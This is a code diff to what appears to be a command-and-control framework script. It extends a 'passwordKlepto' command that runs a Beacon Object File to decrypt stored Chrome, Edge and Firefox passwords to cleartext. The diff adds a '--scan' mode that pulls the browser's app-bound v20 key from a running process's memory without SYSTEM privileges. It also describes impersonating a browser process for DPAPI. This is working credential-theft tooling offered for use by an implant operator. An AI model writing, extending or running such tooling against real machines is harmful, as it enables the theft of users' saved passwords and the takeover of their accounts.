@@ -303,26 +303,28 @@ cmd_underlaycopy.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
 
 
 
-var cmd_password_klepto = ax.create_command("passwordKlepto", "Decrypt stored Chrome/Edge/Firefox passwords to cleartext in-process", "passwordKlepto [-b [chrome || msedge || firefox || all]] [-p pid] [--no-v20] [--no-firefox]");
+var cmd_password_klepto = ax.create_command("passwordKlepto", "Decrypt stored Chrome/Edge/Firefox passwords to cleartext in-process", "passwordKlepto [-b [chrome || msedge || firefox || all]] [-p pid] [--no-v20] [--no-firefox] [--scan]");
 cmd_password_klepto.addArgFlagString("-b", "browser",   "Target 'chrome', 'msedge', 'firefox' or 'all' (default all)", "");
-cmd_password_klepto.addArgFlagInt(   "-p", "pid",        "Browser PID to impersonate for DPAPI when the beacon is SYSTEM (0 = none)", 0);
+cmd_password_klepto.addArgFlagInt(   "-p", "pid",        "Browser PID to impersonate for DPAPI when the beacon is SYSTEM, OR the chrome/msedge PID to -scan (0 = none / auto-find)", 0);
 cmd_password_klepto.addArgBool(      "--no-v20",        "Skip the app-bound v20 key derivation (v10 only for Chrome/Edge)");
 cmd_password_klepto.addArgBool(      "--no-firefox",   "Skip Firefox when running against 'all'");
+cmd_password_klepto.addArgBool(      "--scan",         "Std-user ABE path: scan a running chrome/msedge's memory for the v20 app-bound key (no SYSTEM/hollowing). Ensure the browser has autofilled a saved v20 login first; -p targets a specific PID (0 = auto-find). Chrome/Edge only.");
 cmd_password_klepto.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
 {
     let browser = parsed_json["browser"];
     let pid     = parsed_json["pid"];
     let doV20   = parsed_json["--no-v20"]      ? 0 : 1;
     let doFf    = parsed_json["--no-firefox"]  ? 0 : 1;
+    let scan    = parsed_json["--scan"]        ? 1 : 0;
 
     if (browser.length > 0 && browser != "chrome" && browser != "msedge" && browser != "firefox" && browser != "all") {
         throw new Error("Target 'chrome', 'msedge', 'firefox' or 'all' only !");
     }
     if (browser == "all") browser = "";
 
-    // go() parse order: browser(cstr), profileOverride(cstr), pid(int), doV20(int), doFirefox(int)
+    // go() parse order: browser(cstr), profileOverride(cstr), pid(int), doV20(int), doFirefox(int), scanMode(int)
     let bof_path = ax.script_dir() + "_bin/passwordKlepto." + ax.arch(id) + ".o";
-    let bof_params = ax.bof_pack("cstr,cstr,int,int,int", [ browser, "", pid, doV20, doFf ]);
+    let bof_params = ax.bof_pack("cstr,cstr,int,int,int,int", [ browser, "", pid, doV20, doFf, scan ]);
     ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Running passwordKlepto BOF");
 });
 
